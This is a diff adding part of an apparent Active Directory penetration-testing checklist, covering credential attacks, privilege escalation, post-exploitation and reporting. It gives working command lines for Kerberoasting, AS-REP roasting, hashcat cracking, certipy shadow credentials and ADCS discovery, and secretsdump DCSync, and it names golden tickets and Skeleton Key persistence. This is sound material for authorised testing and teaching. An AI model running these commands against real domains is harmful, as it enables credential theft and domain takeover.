@@ -1,0 +1,17 @@
+3. **Credential Attacks**
+   - Kerberoasting: `netexec ldap <DC> -u <user> -p <pass> -k --kerberoasting hashes.txt`
+   - AS-REP Roasting: `netexec ldap <DC> -u <user> -p <pass> --asreproasting asrep.txt`
+   - Crack hashes: `hashcat -m 13100 hashes.txt rockyou.txt`
+
+4. **Privilege Escalation Techniques**
+   - Shadow Credentials: `certipy shadow auto -u <user>@<domain> -p <pass> -account <target>`
+   - Resource-Based Constrained Delegation (RBCD)
+   - ADCS exploitation (ESC1-ESC16): `certipy find -vulnerable`
+   - GPO abuse, LAPS password reading, DCSync when permissions allow
+
+5. **Post-Exploitation & Persistence**
+   - DCSync: `secretsdump.py <domain>/<user>:<pass>@<DC>`
+   - Golden/Silver Ticket creation
+   - Skeleton Key, SID History injection
+
+6. **Reporting**: Document all findings with evidence, impact assessment, and remediation steps.
